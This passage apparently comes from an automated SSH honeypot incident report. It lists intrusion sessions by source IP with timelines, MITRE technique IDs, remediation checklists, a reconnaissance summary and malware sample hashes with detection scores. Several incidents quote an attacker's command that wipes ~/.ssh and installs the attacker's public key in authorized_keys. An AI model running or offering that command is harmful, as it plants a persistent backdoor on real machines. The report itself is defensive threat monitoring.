| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 09:00:46` | `cowrie.session.connect` |
| `2026-06-16 09:00:46` | `cowrie.client.version` |
| `2026-06-16 09:00:46` | `cowrie.client.kex` |
| `2026-06-16 09:00:46` | `cowrie.login.success` |
| `2026-06-16 09:00:47` | `cowrie.session.params` |
| `2026-06-16 09:00:47` | `cowrie.command.input` |
| `2026-06-16 09:00:47` | `cowrie.command.failed` |
| `2026-06-16 09:00:47` | `cowrie.log.closed` |
| `2026-06-16 09:00:47` | `cowrie.session.params` |
| `2026-06-16 09:00:47` | `cowrie.command.input` |
| `2026-06-16 09:00:47` | `cowrie.session.file_download` |
| `2026-06-16 09:00:47` | `cowrie.log.closed` |
| `2026-06-16 09:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acbbb8ef0ca4

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-06-16 09:00 |
| **Last Seen** | 2026-06-16 09:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 09:00:50` | `cowrie.session.connect` |
| `2026-06-16 09:00:50` | `cowrie.client.version` |
| `2026-06-16 09:00:50` | `cowrie.client.kex` |
| `2026-06-16 09:00:50` | `cowrie.login.success` |
| `2026-06-16 09:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-741de0ebdd4b

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-06-16 09:08 |
| **Last Seen** | 2026-06-16 09:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 09:08:04` | `cowrie.session.connect` |
| `2026-06-16 09:08:04` | `cowrie.client.version` |
| `2026-06-16 09:08:04` | `cowrie.client.kex` |
| `2026-06-16 09:08:04` | `cowrie.login.success` |
| `2026-06-16 09:08:05` | `cowrie.session.params` |
| `2026-06-16 09:08:05` | `cowrie.command.input` |
| `2026-06-16 09:08:05` | `cowrie.command.failed` |
| `2026-06-16 09:08:05` | `cowrie.log.closed` |
| `2026-06-16 09:08:05` | `cowrie.session.params` |
| `2026-06-16 09:08:05` | `cowrie.command.input` |
| `2026-06-16 09:08:05` | `cowrie.session.file_download` |
| `2026-06-16 09:08:05` | `cowrie.log.closed` |
| `2026-06-16 09:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71b3ce5a07f5

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-06-16 09:08 |
| **Last Seen** | 2026-06-16 09:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 09:08:07` | `cowrie.session.connect` |
| `2026-06-16 09:08:07` | `cowrie.client.version` |
| `2026-06-16 09:08:08` | `cowrie.client.kex` |
| `2026-06-16 09:08:08` | `cowrie.login.success` |
| `2026-06-16 09:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eb2b69f92a9

| Field | Detail |
|---|---|
| **Source IP** | `190.128.201[.]18` |
| **First Seen** | 2026-06-16 09:57 |
| **Last Seen** | 2026-06-16 09:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 09:57:01` | `cowrie.session.connect` |
| `2026-06-16 09:57:01` | `cowrie.client.version` |
| `2026-06-16 09:57:01` | `cowrie.client.kex` |
| `2026-06-16 09:57:03` | `cowrie.login.success` |
| `2026-06-16 09:57:04` | `cowrie.session.params` |
| `2026-06-16 09:57:04` | `cowrie.command.input` |
| `2026-06-16 09:57:04` | `cowrie.command.failed` |
| `2026-06-16 09:57:04` | `cowrie.log.closed` |
| `2026-06-16 09:57:05` | `cowrie.session.params` |
| `2026-06-16 09:57:05` | `cowrie.command.input` |
| `2026-06-16 09:57:05` | `cowrie.session.file_download` |
| `2026-06-16 09:57:05` | `cowrie.log.closed` |
| `2026-06-16 09:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.128.201[.]18` to AbuseIPDB if not already reported
- [ ] Block `190.128.201[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28783a71630e

| Field | Detail |
|---|---|
| **Source IP** | `190.128.201[.]18` |
| **First Seen** | 2026-06-16 09:57 |
| **Last Seen** | 2026-06-16 09:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 09:57:09` | `cowrie.session.connect` |
| `2026-06-16 09:57:09` | `cowrie.client.version` |
| `2026-06-16 09:57:09` | `cowrie.client.kex` |
| `2026-06-16 09:57:11` | `cowrie.login.success` |
| `2026-06-16 09:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.128.201[.]18` to AbuseIPDB if not already reported
- [ ] Block `190.128.201[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b35f46519de

| Field | Detail |
|---|---|
| **Source IP** | `190.128.201[.]18` |
| **First Seen** | 2026-06-16 09:59 |
| **Last Seen** | 2026-06-16 09:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 09:59:15` | `cowrie.session.connect` |
| `2026-06-16 09:59:15` | `cowrie.client.version` |
| `2026-06-16 09:59:16` | `cowrie.client.kex` |
| `2026-06-16 09:59:17` | `cowrie.login.success` |
| `2026-06-16 09:59:18` | `cowrie.session.params` |
| `2026-06-16 09:59:18` | `cowrie.command.input` |
| `2026-06-16 09:59:18` | `cowrie.command.failed` |
| `2026-06-16 09:59:19` | `cowrie.log.closed` |
| `2026-06-16 09:59:19` | `cowrie.session.params` |
| `2026-06-16 09:59:19` | `cowrie.command.input` |
| `2026-06-16 09:59:19` | `cowrie.session.file_download` |
| `2026-06-16 09:59:19` | `cowrie.log.closed` |
| `2026-06-16 09:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.128.201[.]18` to AbuseIPDB if not already reported
- [ ] Block `190.128.201[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428158031ee9

| Field | Detail |
|---|---|
| **Source IP** | `190.128.201[.]18` |
| **First Seen** | 2026-06-16 09:59 |
| **Last Seen** | 2026-06-16 09:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 09:59:23` | `cowrie.session.connect` |
| `2026-06-16 09:59:23` | `cowrie.client.version` |
| `2026-06-16 09:59:23` | `cowrie.client.kex` |
| `2026-06-16 09:59:25` | `cowrie.login.success` |
| `2026-06-16 09:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.128.201[.]18` to AbuseIPDB if not already reported
- [ ] Block `190.128.201[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ebc00ec9fb

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-06-16 11:14 |
| **Last Seen** | 2026-06-16 11:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 11:14:06` | `cowrie.session.connect` |
| `2026-06-16 11:14:06` | `cowrie.client.version` |
| `2026-06-16 11:14:06` | `cowrie.client.kex` |
| `2026-06-16 11:14:07` | `cowrie.login.success` |
| `2026-06-16 11:14:07` | `cowrie.session.params` |
| `2026-06-16 11:14:07` | `cowrie.command.input` |
| `2026-06-16 11:14:07` | `cowrie.command.failed` |
| `2026-06-16 11:14:08` | `cowrie.log.closed` |
| `2026-06-16 11:14:08` | `cowrie.session.params` |
| `2026-06-16 11:14:08` | `cowrie.command.input` |
| `2026-06-16 11:14:09` | `cowrie.session.file_download` |
| `2026-06-16 11:14:09` | `cowrie.log.closed` |
| `2026-06-16 11:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2779492a8bc6

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-06-16 11:14 |
| **Last Seen** | 2026-06-16 11:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-16 11:14:12` | `cowrie.session.connect` |
| `2026-06-16 11:14:12` | `cowrie.client.version` |
| `2026-06-16 11:14:12` | `cowrie.client.kex` |
| `2026-06-16 11:14:13` | `cowrie.login.success` |
| `2026-06-16 11:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `73.36.177[.]174` | **25** | 2026-06-16 06:21 | 2026-06-16 07:17 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.225.146[.]23` | **6** | 2026-06-16 07:47 | 2026-06-16 09:12 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `157.230.150[.]187` | **5** | 2026-06-16 08:57 | 2026-06-16 10:00 | 3m | 0 | `T1592` | 🟢 LOW |
| `171.231.180[.]167` | **3** | 2026-06-16 05:14 | 2026-06-16 05:14 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `190.128.201[.]18` | **3** | 2026-06-16 08:37 | 2026-06-16 09:59 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `27.110.166[.]67` | **3** | 2026-06-16 10:36 | 2026-06-16 10:43 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `157.230.150[.]187` | **2** | 2026-06-16 05:34 | 2026-06-16 06:43 | 1m | 0 | `T1592` | 🟢 LOW |
| `18.191.32[.]78` | **2** | 2026-06-16 08:00 | 2026-06-16 08:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]126` | **2** | 2026-06-16 05:57 | 2026-06-16 05:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.106.17[.]55` | **2** | 2026-06-16 07:44 | 2026-06-16 07:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.138.194[.]68` | **2** | 2026-06-16 11:06 | 2026-06-16 11:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `59.16.212[.]232` | **2** | 2026-06-16 09:40 | 2026-06-16 09:48 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.235.192[.]131` | 1 | 2026-06-16 05:31 | 2026-06-16 05:31 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.250.11[.]176` | 1 | 2026-06-16 07:06 | 2026-06-16 07:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.56.73[.]17` | 1 | 2026-06-16 10:20 | 2026-06-16 10:20 | 14s | 0 | `T1592` | 🟢 LOW |
| `107.0.200[.]227` | 1 | 2026-06-16 08:33 | 2026-06-16 08:33 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.228.33[.]68` | 1 | 2026-06-16 10:38 | 2026-06-16 10:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.88.48[.]171` | 1 | 2026-06-16 11:13 | 2026-06-16 11:14 | 30s | 0 | `T1592` | 🟢 LOW |
| `118.130.168[.]66` | 1 | 2026-06-16 05:17 | 2026-06-16 05:17 | 2s | 0 | `T1592` | 🟢 LOW |
| `119.152.102[.]54` | 1 | 2026-06-16 05:33 | 2026-06-16 05:33 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.14[.]72` | 1 | 2026-06-16 05:16 | 2026-06-16 05:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.117.231[.]166` | 1 | 2026-06-16 07:24 | 2026-06-16 07:25 | 14s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]100` | 1 | 2026-06-16 06:21 | 2026-06-16 06:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.230[.]55` | 1 | 2026-06-16 06:16 | 2026-06-16 06:16 | 13s | 0 | `T1592` | 🟢 LOW |
| `169.212.47[.]188` | 1 | 2026-06-16 08:09 | 2026-06-16 08:10 | 30s | 0 | `T1592` | 🟢 LOW |
| `171.8.42[.]112` | 1 | 2026-06-16 10:58 | 2026-06-16 10:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-06-16 09:00 | 2026-06-16 09:00 | 10s | 0 | `T1592` | 🟢 LOW |
| `175.107.32[.]186` | 1 | 2026-06-16 08:30 | 2026-06-16 08:30 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.158.163[.]203` | 1 | 2026-06-16 08:15 | 2026-06-16 08:15 | 13s | 0 | `T1592` | 🟢 LOW |
| `177.128.224[.]122` | 1 | 2026-06-16 10:29 | 2026-06-16 10:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]50` | 1 | 2026-06-16 05:17 | 2026-06-16 05:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.95.48[.]154` | 1 | 2026-06-16 06:33 | 2026-06-16 06:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.11[.]79` | 1 | 2026-06-16 06:17 | 2026-06-16 06:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.15[.]149` | 1 | 2026-06-16 10:32 | 2026-06-16 10:32 | 1s | 0 | `T1592` | 🟢 LOW |
| `183.56.179[.]201` | 1 | 2026-06-16 08:16 | 2026-06-16 08:16 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `189.181.2[.]226` | 1 | 2026-06-16 08:43 | 2026-06-16 08:43 | 12s | 0 | `T1592` | 🟢 LOW |
| `200.37.179[.]83` | 1 | 2026-06-16 09:02 | 2026-06-16 09:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.218.0[.]25` | 1 | 2026-06-16 08:30 | 2026-06-16 08:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `204.48.28[.]177` | 1 | 2026-06-16 09:12 | 2026-06-16 09:12 | 10s | 0 | `T1592` | 🟢 LOW |
| `211.23.109[.]116` | 1 | 2026-06-16 10:16 | 2026-06-16 10:16 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.186.233[.]10` | 1 | 2026-06-16 11:15 | 2026-06-16 11:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.154.42[.]110` | 1 | 2026-06-16 10:28 | 2026-06-16 10:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.200.9[.]182` | 1 | 2026-06-16 08:00 | 2026-06-16 08:00 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.110.147[.]58` | 1 | 2026-06-16 10:29 | 2026-06-16 10:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.139.245[.]137` | 1 | 2026-06-16 07:32 | 2026-06-16 07:33 | 51s | 0 | `T1592` | 🟢 LOW |
| `222.190.110[.]210` | 1 | 2026-06-16 05:04 | 2026-06-16 05:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.11.232[.]245` | 1 | 2026-06-16 06:27 | 2026-06-16 06:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `41.242.115[.]84` | 1 | 2026-06-16 11:14 | 2026-06-16 11:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.153.13[.]30` | 1 | 2026-06-16 07:48 | 2026-06-16 07:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.153[.]17` | 1 | 2026-06-16 10:28 | 2026-06-16 10:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.206.201[.]253` | 1 | 2026-06-16 06:01 | 2026-06-16 06:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.205[.]197` | 1 | 2026-06-16 09:59 | 2026-06-16 09:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-06-16 09:49 | 2026-06-16 09:50 | 10s | 0 | `T1592` | 🟢 LOW |
| `82.102.165[.]200` | 1 | 2026-06-16 07:46 | 2026-06-16 07:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `88.248.250[.]143` | 1 | 2026-06-16 10:16 | 2026-06-16 10:17 | 108s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
